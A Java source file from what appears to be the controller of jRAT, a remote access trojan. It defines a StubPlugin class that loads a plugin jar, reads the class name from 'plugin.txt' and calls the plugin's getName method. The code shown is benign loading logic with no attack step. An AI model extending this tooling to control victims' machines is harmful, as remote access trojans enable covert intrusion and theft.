package io.jrat.controller.addons;

import io.jrat.controller.Main;
import io.jrat.controller.utils.IOUtils;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Enumeration;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;


public class StubPlugin {

	public String path;
	public String clazz;
	public String name;

	public StubPlugin(String path, boolean load) {
		this.path = path;
		if (load) {
			try {
				JarFile jar = new JarFile(path);

				Enumeration<? extends ZipEntry> e = jar.entries();
				while (e.hasMoreElements()) {
					ZipEntry entry = e.nextElement();
					if (entry.getName().equals("plugin.txt")) {
						clazz = IOUtils.readString(jar.getInputStream(entry));
						break;
					}
				}
				jar.close();

				URLClassLoader loader = new URLClassLoader(new URL[] { new URL("file:" + path) }, Main.class.getClassLoader());
				Class<?> classToLoad = Class.forName(clazz, true, loader);
				Object instance = classToLoad.newInstance();

				name = (String) classToLoad.getMethod("getName", new Class[] {}).invoke(instance);

			} catch (Exception ex) {
				ex.printStackTrace();
			}
		} else {
			name = path;
		}
	}
}
